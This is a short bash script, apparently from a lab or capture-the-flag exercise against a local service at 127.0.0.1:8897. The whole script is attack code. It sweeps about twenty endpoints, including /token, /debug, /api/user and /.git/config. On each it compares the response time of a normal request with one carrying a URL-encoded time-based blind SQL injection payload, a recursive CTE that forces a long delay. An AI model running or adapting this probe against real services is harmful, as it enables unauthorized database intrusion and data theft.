H='http://127.0.0.1:8897'
P='1%20AND%201=(WITH%20RECURSIVE%20c(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x+1%20FROM%20c%20WHERE%20x%3C200000000)%20SELECT%20max(x)%20FROM%20c)'
for r in "/" "/search" "/item" "/user" "/files" "/faq" "/echo" "/debug" "/token" "/api/user" "/orders/1001" "/orders/1001/items" "/fetch" "/robots.txt" "/static/app.js" "/.git/config" "/.git/" "/.git" "/.git/config/" ; do
  b=$(curl -s -o /dev/null -w "%{time_total}" "$H$r")
  s=$(curl -s -o /dev/null -w "%{time_total} %{size_download} %{http_code}" "$H$r?p=$P")
  echo "$r  base=$b  inj=$s"
done
